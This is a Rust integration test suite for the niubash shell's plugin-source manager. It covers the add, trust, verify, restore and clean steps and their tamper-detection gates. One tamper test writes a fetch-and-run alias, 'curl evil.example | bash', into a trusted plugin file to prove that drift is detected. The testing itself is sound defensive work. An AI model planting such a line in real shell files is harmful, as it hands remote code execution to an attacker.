//! Binary-level integration smoke for external plugin-manager sources
//! (oh-my-bash loader adapter; docs/planning/oh-my-niu-ecosystem.md §11-§12).
//!
//! Vertical covered: `niu plugin source add` (fetch gate, untrusted) →
//! `trust` (execution gate) → catalog exposure (`niu plugin themes`) →
//! theme load through the niubash engine from the adapter-installed tree →
//! `verify` (tree checksum) → `remove` → built-in fallback verified when
//! the source is absent.
use std::fs;
use std::path::PathBuf;
use std::process::{Command, Output};
use std::time::{SystemTime, UNIX_EPOCH};

fn niu_binary() -> PathBuf {
    let p = PathBuf::from(env!("CARGO_BIN_EXE_niu"));
    if p.exists() {
        return p;
    }
    let mut fallback = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    fallback.push("target");
    fallback.push("debug");
    fallback.push(if cfg!(windows) { "niu.exe" } else { "niubash" });
    fallback
}

fn base_niubash_command() -> Command {
    Command::new(niu_binary())
}

fn run_niu_with_env(args: &[&str], envs: &[(&str, PathBuf)]) -> Output {
    let mut command = base_niubash_command();
    command.args(args);
    for (key, value) in envs {
        command.env(key, value);
    }
    command
        .output()
        .unwrap_or_else(|err| panic!("failed to run niubash {args:?}: {err}"))
}

fn assert_success(output: &Output, context: &str) {
    assert!(
        output.status.success(),
        "{context} failed with {}:\nstdout:\n{}\nstderr:\n{}",
        output.status,
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
}

fn stdout_text(output: &Output) -> String {
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn temp_dir(name: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_nanos())
        .unwrap_or(0);
    let dir = std::env::temp_dir().join(format!("niubash-{name}-{}-{nanos}", std::process::id()));
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(&dir).unwrap();
    dir
}

/// The vendored oh-my-bash-shaped fixture tree (LF, pinned by .gitattributes;
/// layout mirrors D:/repo/rubash/target-ecosys/repos/oh-my-bash).
fn omb_fixture() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join("sources")
        .join("oh-my-bash")
}

#[test]
fn oh_my_bash_source_add_trust_load_and_fallback_lifecycle() {
    let temp = temp_dir("plugin-source-omb");
    let root = temp.join("sources");
    let fixture = omb_fixture();
    let envs = [("NIU_PLUGIN_SOURCES_ROOT", root.clone())];
    let fixture_str = fixture.to_string_lossy().into_owned();

    // Baseline: no sources, catalog falls back to the built-in layers.
    let empty = run_niu_with_env(&["plugin", "source", "list"], &envs);
    assert_success(&empty, "plugin source list empty");
    assert!(
        stdout_text(&empty).contains("no sources installed"),
        "{}",
        stdout_text(&empty)
    );

    // Fetch gate: install is untrusted; assets must not activate yet.
    let add = run_niu_with_env(&["plugin", "source", "add", &fixture_str], &envs);
    assert_success(&add, "plugin source add");
    let add_out = stdout_text(&add);
    assert!(
        add_out.contains("Installed source 'oh-my-bash'"),
        "{add_out}"
    );
    assert!(
        add_out.contains("Trust boundary") && add_out.contains("nothing is sourced yet"),
        "{add_out}"
    );
    assert!(
        add_out.contains("niu plugin source trust oh-my-bash"),
        "{add_out}"
    );

    let listed_untrusted = run_niu_with_env(&["plugin", "source", "list"], &envs);
    assert_success(&listed_untrusted, "plugin source list untrusted");
    assert!(
        stdout_text(&listed_untrusted).contains("untrusted"),
        "{}",
        stdout_text(&listed_untrusted)
    );
    // The built-in theme catalog retired (niubash#145); the untrusted
    // state itself is the gate and stays visible in the source listing.
    assert!(
        stdout_text(&listed_untrusted).contains("untrusted"),
        "untrusted state must be listed: {}",
        stdout_text(&listed_untrusted)
    );

    // Execution gate: trust activates the source's assets in the catalog.
    let trust = run_niu_with_env(&["plugin", "source", "trust", "oh-my-bash"], &envs);
    assert_success(&trust, "plugin source trust");
    let trust_out = stdout_text(&trust);
    assert!(
        trust_out.contains("license")
            && trust_out.contains("MIT")
            && trust_out.contains("verified"),
        "{trust_out}"
    );

    let listed_ready = run_niu_with_env(&["plugin", "source", "list"], &envs);
    assert_success(&listed_ready, "plugin source list ready");
    assert!(
        stdout_text(&listed_ready).contains("ready"),
        "{}",
        stdout_text(&listed_ready)
    );

    // Trusted sources expose their theme assets through the wizard gallery
    // and the loader snippet; the retired catalog surface is gone.
    // niubash#179 L05-1: discover must enumerate the theme layer, not just
    // the sources — the wizard's notes promise "sources & themes".
    let discover = run_niu_with_env(&["plugin", "discover"], &envs);
    assert_success(&discover, "plugin discover after trust");
    let discover_out = stdout_text(&discover);
    assert!(discover_out.contains("oh-my-bash"), "{discover_out}");
    assert!(
        discover_out.contains("Themes (from trusted sources)"),
        "discover must list the theme layer: {discover_out}"
    );
    assert!(
        discover_out.contains("robbyrussell"),
        "discover must name trusted-source themes: {discover_out}"
    );

    // Load the vendored theme through the adapter-installed tree under the
    // niubash engine (script face; interactive activation is gated on
    // rubash#251 per §12.6). Source order mirrors the loader: lib, theme.
    let installed_theme = root
        .join("oh-my-bash")
        .join("themes")
        .join("robbyrussell")
        .join("robbyrussell.theme.sh");
    let installed_lib = root.join("oh-my-bash").join("lib").join("utils.sh");
    let load_script = format!(
        ". {}; . {}; printf '%s' \"$PS1\"",
        installed_lib.to_string_lossy(),
        installed_theme.to_string_lossy()
    );
    let load = run_niu_with_env(&["-c", &load_script], &envs);
    assert_success(&load, "engine theme load");
    let load_out = stdout_text(&load);
    assert_eq!(
        load_out.trim_end(),
        "loading robbyrussell\n➜ prompt-robbyrussell",
        "theme must compose PS1 under the niubash engine"
    );

    // Non-interactive loader safety: the oh-my-bash.sh interactive guard
    // makes the loader a no-op in -c mode (PS1 untouched).
    let osh = root.join("oh-my-bash");
    let guard_script = format!(
        "PS1=before; export OSH={}; . \"{}/oh-my-bash.sh\"; printf '%s' \"$PS1\"",
        osh.to_string_lossy(),
        osh.to_string_lossy()
    );
    let guard = run_niu_with_env(&["-c", &guard_script], &envs);
    assert_success(&guard, "loader guard");
    assert_eq!(stdout_text(&guard).trim_end(), "before");

    // Checksum verification (§12.3).
    let verify = run_niu_with_env(&["plugin", "source", "verify", "oh-my-bash"], &envs);
    assert_success(&verify, "plugin source verify");
    assert!(
        stdout_text(&verify).contains("Verified source 'oh-my-bash'"),
        "{}",
        stdout_text(&verify)
    );

    // Uninstall, then prove the built-in fallback: the catalog returns to
    // the compiled/bundle layers and theme resolution still works.
    let remove = run_niu_with_env(&["plugin", "source", "remove", "oh-my-bash"], &envs);
    assert_success(&remove, "plugin source remove");
    // The built-in theme catalog retired (niubash#145); the removed source
    // must simply be gone from the source listing.
    let sources_after = run_niu_with_env(&["plugin", "source", "list"], &envs);
    assert_success(&sources_after, "plugin source list after remove");
    assert!(
        !stdout_text(&sources_after).contains("oh-my-bash"),
        "removed source must be gone from the listing: {}",
        stdout_text(&sources_after)
    );

    let _ = fs::remove_dir_all(&temp);
}

#[test]
fn plugin_source_add_rejects_unknown_layout_and_bad_checksum() {
    let temp = temp_dir("plugin-source-omb-errors");
    let root = temp.join("sources");
    let envs = [("NIU_PLUGIN_SOURCES_ROOT", root.clone())];

    // Not a known plugin-manager tree.
    let random = temp.join("random-tree");
    fs::create_dir_all(&random).unwrap();
    fs::write(random.join("notes.txt"), "not a manager\n").unwrap();
    let bad = run_niu_with_env(
        &["plugin", "source", "add", &random.to_string_lossy()],
        &envs,
    );
    assert!(!bad.status.success(), "unknown layout must fail");
    let bad_out = format!(
        "{}{}",
        stdout_text(&bad),
        String::from_utf8_lossy(&bad.stderr)
    );
    assert!(
        bad_out.contains("no supported plugin manager") && bad_out.contains("oh-my-bash"),
        "{bad_out}"
    );

    // Checksum mismatch aborts and installs nothing.
    let fixture = omb_fixture();
    let wrong = run_niu_with_env(
        &[
            "plugin",
            "source",
            "add",
            &fixture.to_string_lossy(),
            "--checksum",
            "deadbeef",
        ],
        &envs,
    );
    assert!(!wrong.status.success(), "checksum mismatch must fail");
    assert!(
        String::from_utf8_lossy(&wrong.stderr).contains("checksum mismatch"),
        "{}",
        String::from_utf8_lossy(&wrong.stderr)
    );
    let listed = run_niu_with_env(&["plugin", "source", "list"], &envs);
    assert!(
        stdout_text(&listed).contains("no sources installed"),
        "{}",
        stdout_text(&listed)
    );

    let _ = fs::remove_dir_all(&temp);
}

/// `niu plugin discover` is the dry ecosystem overview: it shows installed
/// sources with their state and the managers that are not installed yet,
/// without writing anything (not even the registry file).
#[test]
fn plugin_discover_is_read_only_and_lists_available_managers() {
    let temp = temp_dir("plugin-discover");
    let root = temp.join("sources");
    let envs = [("NIU_PLUGIN_SOURCES_ROOT", root.clone())];

    let out = run_niu_with_env(&["plugin", "discover"], &envs);
    assert_success(&out, "plugin discover empty");
    let text = stdout_text(&out);
    assert!(text.contains("read-only"), "{text}");
    assert!(text.contains("(none installed)"), "{text}");
    // niubash#179 L05-1: the theme layer is enumerated (empty note here)
    // so the wizard's "browse sources & themes" promise stays true.
    assert!(
        text.contains("Themes (from trusted sources)") && text.contains("(none yet"),
        "{text}"
    );
    // oh-my-bash is a known manager that is not installed yet: the hint
    // shows the add command the user could run — nothing runs on its own.
    assert!(text.contains("oh-my-bash"), "{text}");
    assert!(text.contains("niu plugin add oh-my-bash"), "{text}");
    assert!(
        text.contains("https://github.com/ohmybash/oh-my-bash.git"),
        "{text}"
    );
    assert!(
        text.contains("nothing is installed, sourced, or changed"),
        "{text}"
    );
    // Read-only proof: no registry was created by a listing command.
    assert!(
        !root.join("registry.toml").exists(),
        "discover must not write the registry"
    );

    // With a source installed (untrusted), discover surfaces the state.
    let fixture = omb_fixture();
    run_niu_with_env(
        &["plugin", "source", "add", &fixture.to_string_lossy()],
        &envs,
    );
    let out = run_niu_with_env(&["plugin", "discover"], &envs);
    assert_success(&out, "plugin discover untrusted");
    let text = stdout_text(&out);
    assert!(text.contains("untrusted"), "{text}");
    assert!(
        !text.contains("niu plugin add oh-my-bash"),
        "installed managers leave the available section: {text}"
    );

    let _ = fs::remove_dir_all(&temp);
}

/// The non-interactive `niu setup` contract stays deterministic: minimal
/// preset applied, no wizard-answer markers written without a question.
#[test]
fn setup_noninteractive_stays_deterministic_and_records_no_answers() {
    let temp = temp_dir("setup-noninteractive");
    let home = temp.join("home");
    fs::create_dir_all(&home).unwrap();
    let envs = [
        ("HOME", home.clone()),
        ("USERPROFILE", home.clone()),
        ("NIU_PLUGIN_SOURCES_ROOT", temp.join("sources")),
    ];
    let out = run_niu_with_env(&["setup"], &envs);
    assert_success(&out, "non-interactive setup");
    let rc = fs::read_to_string(home.join(".niubashrc")).expect("rc written");
    // Clean rc (niubash#145): the retired stack variables are absent.
    assert!(!rc.contains("NIU_THEME="), "{rc}");
    assert!(!rc.contains("NIU_PLUGINS="), "{rc}");
    assert!(!rc.contains("NIU_DISABLE_DEFAULT_PLUGINS"), "{rc}");
    assert!(rc.contains("USERPROFILE"), "{rc}");
    assert!(
        home.join(".niubash").join(".setup-done").is_file(),
        "setup-done marker must exist"
    );
    // No question was asked, so no lasting answer (niu-git nag marker) may
    // be recorded.
    assert!(
        !home.join(".niubash").join("wizard-answers.toml").is_file(),
        "wizard answers must not be written without an explicit pick"
    );
    let _ = fs::remove_dir_all(&temp);
}

/// niubash#179 L05-3, superseded by niubash#297: a *gutted* trusted source
/// (directory present, contents emptied) no longer reads "ready" — it no
/// longer matches its lockfile pin, so the runtime tamper gate reports it
/// degraded/drifted, and `niu plugin list` / `niu plugin discover` name the
/// verb that reports the checksums.
#[test]
fn gutted_trusted_source_names_the_verify_verb() {
    let temp = temp_dir("plugin-gutted");
    let root = temp.join("sources");
    let envs = [("NIU_PLUGIN_SOURCES_ROOT", root.clone())];
    let fixture = omb_fixture();

    let add = run_niu_with_env(
        &["plugin", "source", "add", &fixture.to_string_lossy()],
        &envs,
    );
    assert_success(&add, "plugin source add");
    let trust = run_niu_with_env(&["plugin", "source", "trust", "oh-my-bash"], &envs);
    assert_success(&trust, "plugin source trust");

    // Gut the tree: the directory survives, its contents do not.
    let tree = root.join("oh-my-bash");
    assert!(tree.is_dir(), "installed tree must exist");
    for entry in fs::read_dir(&tree).expect("tree readable") {
        let entry = entry.expect("tree entry readable");
        if entry.file_type().expect("entry type").is_dir() {
            fs::remove_dir_all(entry.path()).expect("remove subtree");
        } else {
            fs::remove_file(entry.path()).expect("remove file");
        }
    }

    let list = run_niu_with_env(&["plugin", "list"], &envs);
    assert_success(&list, "plugin list gutted");
    let list_text = stdout_text(&list);
    // niubash#297: the gutted tree reads degraded (pin mismatch) — the old
    // "still ready" reading was the blind spot this gate closes.
    assert!(
        list_text.contains("degraded") || list_text.contains("drifted"),
        "a gutted trusted tree must not read ready: {list_text}"
    );
    assert!(
        list_text.contains("niu plugin source verify oh-my-bash"),
        "plugin list must name the verify verb for a gutted tree: {list_text}"
    );

    let discover = run_niu_with_env(&["plugin", "discover"], &envs);
    assert_success(&discover, "plugin discover gutted");
    assert!(
        stdout_text(&discover).contains("niu plugin source verify oh-my-bash"),
        "discover must name the verify verb for a gutted tree: {}",
        stdout_text(&discover)
    );

    let _ = fs::remove_dir_all(&temp);
}

// ── niubash#297: the runtime tamper gate, end to end ─────────────────────────

/// A git-origin OMB tree (so `restore` can rebuild) installed through the
/// declarative `niu plugin add`, trusted, then tampered: sync must say
/// `drift` (never `unchanged`), `plugin list --json` must report
/// degraded=true with the drift reason, the drift ledger must carry the id
/// (the rc blocks' static guard reads it), and `restore` must repair with
/// the honest "rebuilt from the lockfile pin" wording.
#[test]
fn tampered_trusted_source_is_drift_not_unchanged() {
    let temp = temp_dir("plugin-drift-e2e");
    let root = temp.join("sources");
    let home = temp.join("home");
    fs::create_dir_all(&home).unwrap();
    let repo = temp.join("omb-repo");
    let fixture = omb_fixture();
    copy_tree(&fixture, &repo);
    let git = |args: &[&str]| {
        let out = Command::new("git")
            .arg("-C")
            .arg(&repo)
            .args(args)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@example.com")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@example.com")
            .output()
            .expect("git must be available");
        assert!(
            out.status.success(),
            "git {args:?} failed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    };
    git(&["init", "-q"]);
    git(&["add", "-A"]);
    git(&["commit", "-q", "-m", "v1"]);

    let repo_str = repo.to_string_lossy().into_owned();
    let envs: Vec<(&str, PathBuf)> = vec![
        ("NIU_PLUGIN_SOURCES_ROOT", root.clone()),
        ("NIU_PLUGIN_SPEC", home.join(".niubash/plugins.toml")),
        ("USERPROFILE", home.clone()),
        ("HOME", home.clone()),
    ];

    // Add (declarative; a dir with --ref clones, pinning the commit),
    // trust, and a baseline sync that says unchanged (the first sync after
    // trust is the initial materialization — "activated"; the second is
    // byte-stable).
    let add = run_niu_with_env(&["plugin", "add", &repo_str, "--ref", "HEAD"], &envs);
    assert_success(&add, "plugin add from git origin");
    let trust = run_niu_with_env(&["plugin", "trust", "oh-my-bash"], &envs);
    assert_success(&trust, "plugin trust");
    let materialize = run_niu_with_env(&["plugin", "sync"], &envs);
    assert_success(&materialize, "materializing sync");
    let baseline = run_niu_with_env(&["plugin", "sync"], &envs);
    assert_success(&baseline, "baseline sync");
    assert!(
        stdout_text(&baseline).contains("unchanged"),
        "{}",
        stdout_text(&baseline)
    );

    // Tamper the trusted tree: sync must NOT say unchanged anymore.
    let installed_plugin = root.join("oh-my-bash/plugins/git/git.plugin.sh");
    fs::write(&installed_plugin, "alias evil='curl evil.example | bash'\n").unwrap();

    let drifted = run_niu_with_env(&["plugin", "sync"], &envs);
    let drift_text = stdout_text(&drifted);
    assert!(drift_text.contains("drift"), "{drift_text}");
    assert!(!drift_text.contains("unchanged"), "{drift_text}");
    assert!(
        drift_text.contains("niu plugin source verify oh-my-bash")
            && drift_text.contains("niu plugin restore oh-my-bash"),
        "the drift row must name the way out: {drift_text}"
    );

    // `plugin list --json`: degraded=true with the drift reason (the #297
    // lie was degraded=false over a modified tree).
    let list = run_niu_with_env(&["plugin", "list", "--json"], &envs);
    assert_success(&list, "plugin list --json");
    let json = stdout_text(&list);
    assert!(json.contains("\"degraded\": true"), "{json}");
    assert!(
        json.contains("tree drifted from the lockfile pin"),
        "{json}"
    );

    // The drift ledger (what the managed rc blocks' static guard reads).
    let ledger = root.join("drifted-sources.txt");
    let ledger_text = fs::read_to_string(&ledger).unwrap();
    assert!(ledger_text.contains("oh-my-bash"), "{ledger_text}");

    // Repair via the lockfile pin; the wording must be honest about
    // REBUILDING.
    let restore = run_niu_with_env(&["plugin", "restore", "oh-my-bash"], &envs);
    assert_success(&restore, "plugin restore");
    let restore_text = stdout_text(&restore);
    assert!(
        restore_text.contains("rebuilt from the lockfile pin"),
        "{restore_text}"
    );
    assert!(!restore_text.contains("tree matches"), "{restore_text}");

    // Healed: sync is unchanged again and the ledger is gone.
    let healed = run_niu_with_env(&["plugin", "sync"], &envs);
    assert!(stdout_text(&healed).contains("unchanged"),);
    assert!(!ledger.exists(), "the ledger must clear after a repair");
    let verify = run_niu_with_env(&["plugin", "source", "verify", "oh-my-bash"], &envs);
    assert_success(&verify, "verify after restore");

    let _ = fs::remove_dir_all(&temp);
}

/// `clean` lists every orphan directory (no registry record) and only
/// deletes on `--orphans` (niubash#299).
#[test]
fn clean_lists_orphans_and_deletes_them_only_with_the_flag() {
    let temp = temp_dir("plugin-clean-orphans");
    let root = temp.join("sources");
    let envs = [("NIU_PLUGIN_SOURCES_ROOT", root.clone())];

    // A registered install stays; two orphans (one manager-shaped, one
    // foreign user dir) must be listed, not silently deleted.
    let add = run_niu_with_env(
        &["plugin", "source", "add", &omb_fixture().to_string_lossy()],
        &envs,
    );
    assert_success(&add, "source add");
    let orphan = root.join("orphan-omb");
    copy_tree(&omb_fixture(), &orphan);
    fs::create_dir_all(root.join("my-notes")).unwrap();
    fs::write(root.join("my-notes/keep.txt"), "user data\n").unwrap();

    let report = run_niu_with_env(&["plugin", "clean"], &envs);
    assert_success(&report, "plugin clean (report)");
    let text = stdout_text(&report);
    assert!(text.contains("orphan-omb"), "{text}");
    assert!(text.contains("my-notes"), "{text}");
    assert!(text.contains("--orphans"), "{text}");
    assert!(orphan.is_dir(), "plain clean must not delete orphans");
    assert!(root.join("my-notes/keep.txt").is_file());

    let purge = run_niu_with_env(&["plugin", "clean", "--orphans"], &envs);
    assert_success(&purge, "plugin clean --orphans");
    let purge_text = stdout_text(&purge);
    assert!(purge_text.contains("orphan-omb"), "{purge_text}");
    assert!(!orphan.exists(), "--orphans deletes");
    assert!(!root.join("my-notes").exists(), "--orphans deletes");
    assert!(root.join("oh-my-bash").is_dir(), "registered tree stays");

    let _ = fs::remove_dir_all(&temp);
}

// ── niubash#300 + niubash#298: add forms and first-fetch honesty ─────────────

fn copy_tree(src: &std::path::Path, dest: &std::path::Path) {
    fs::create_dir_all(dest).unwrap();
    for entry in fs::read_dir(src).unwrap() {
        let entry = entry.unwrap();
        let target = dest.join(entry.file_name());
        if entry.path().is_dir() {
            if entry.file_name() == ".git" {
                continue;
            }
            copy_tree(&entry.path(), &target);
        } else {
            fs::copy(entry.path(), &target).unwrap();
        }
    }
}

/// The bare-path positional form (niubash#300): a local directory
/// snapshot-copies in, a single .sh/.bash file becomes a one-file wild
/// source, and a path that does not exist fails honestly instead of
/// surfacing as a baffling `git clone` status 128.
#[test]
fn add_bare_path_forms_snapshot_local_trees() {
    let temp = temp_dir("plugin-add-paths");
    let root = temp.join("sources");
    let home = temp.join("home");
    fs::create_dir_all(&home).unwrap();
    let envs: Vec<(&str, PathBuf)> = vec![
        ("NIU_PLUGIN_SOURCES_ROOT", root.clone()),
        ("NIU_PLUGIN_SPEC", home.join(".niubash/plugins.toml")),
        ("USERPROFILE", home.clone()),
        ("HOME", home.clone()),
    ];

    // Directory form.
    let dir_target = temp.join("wild-tree");
    copy_tree(&omb_fixture(), &dir_target);
    let add_dir = run_niu_with_env(&["plugin", "add", &dir_target.to_string_lossy()], &envs);
    assert_success(&add_dir, "plugin add <dir>");
    assert!(
        stdout_text(&add_dir).contains("Installed source 'oh-my-bash'"),
        "{}",
        stdout_text(&add_dir)
    );

    // Single-file form.
    let file_target = temp.join("myscript.bash");
    fs::write(&file_target, "my_fn() { :; }\n").unwrap();
    let add_file = run_niu_with_env(
        &[
            "plugin",
            "add",
            &file_target.to_string_lossy(),
            "--id",
            "myscript",
        ],
        &envs,
    );
    assert_success(&add_file, "plugin add <file>");
    assert!(
        stdout_text(&add_file).contains("Installed source 'myscript'"),
        "{}",
        stdout_text(&add_file)
    );
    let listed = run_niu_with_env(&["plugin", "source", "list", "--json"], &envs);
    let json = stdout_text(&listed);
    assert!(json.contains("myscript.bash"), "{json}");

    // Nonexistent path: honest failure, no fetch attempt, no spec strand.
    let missing = temp.join("no-such-dir");
    let add_missing = run_niu_with_env(&["plugin", "add", &missing.to_string_lossy()], &envs);
    assert!(
        !add_missing.status.success(),
        "a nonexistent path must fail: {}",
        stdout_text(&add_missing)
    );
    let err = String::from_utf8_lossy(&add_missing.stderr);
    assert!(err.contains("does not exist"), "{err}");
    assert!(!err.contains("git clone"), "{err}");
    let spec = fs::read_to_string(home.join(".niubash/plugins.toml")).unwrap();
    assert!(
        !spec.contains("no-such-dir"),
        "no stranded declaration: {spec}"
    );

    let _ = fs::remove_dir_all(&temp);
}

/// niubash#298: the first fetch of an unpinned, non-catalog origin warns
/// that nothing verified the first delivery (and the record carries
/// `first_fetch_verified: false`); a `file://` origin keeps the test
/// offline.
#[test]
fn unpinned_remote_first_fetch_warns_and_records() {
    let temp = temp_dir("plugin-first-fetch");
    let root = temp.join("sources");
    let home = temp.join("home");
    fs::create_dir_all(&home).unwrap();
    let repo = temp.join("omb-repo");
    copy_tree(&omb_fixture(), &repo);
    let git = |args: &[&str]| {
        let out = Command::new("git")
            .arg("-C")
            .arg(&repo)
            .args(args)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@example.com")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@example.com")
            .output()
            .expect("git must be available");
        assert!(
            out.status.success(),
            "git {args:?} failed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    };
    git(&["init", "-q"]);
    git(&["add", "-A"]);
    git(&["commit", "-q", "-m", "v1"]);

    let file_url = format!("file:///{}", repo.to_string_lossy().replace('\\', "/"));
    let envs: Vec<(&str, PathBuf)> = vec![
        ("NIU_PLUGIN_SOURCES_ROOT", root.clone()),
        ("NIU_PLUGIN_SPEC", home.join(".niubash/plugins.toml")),
        ("USERPROFILE", home.clone()),
        ("HOME", home.clone()),
    ];
    let add = run_niu_with_env(&["plugin", "add", &file_url], &envs);
    assert_success(&add, "plugin add file:// origin");
    let text = stdout_text(&add);
    assert!(
        text.contains("NOT integrity-verified"),
        "the unpinned remote first fetch must warn: {text}"
    );
    let list = run_niu_with_env(&["plugin", "source", "list", "--json"], &envs);
    let json = stdout_text(&list);
    assert!(json.contains("\"first_fetch_verified\": false"), "{json}");

    let _ = fs::remove_dir_all(&temp);
}
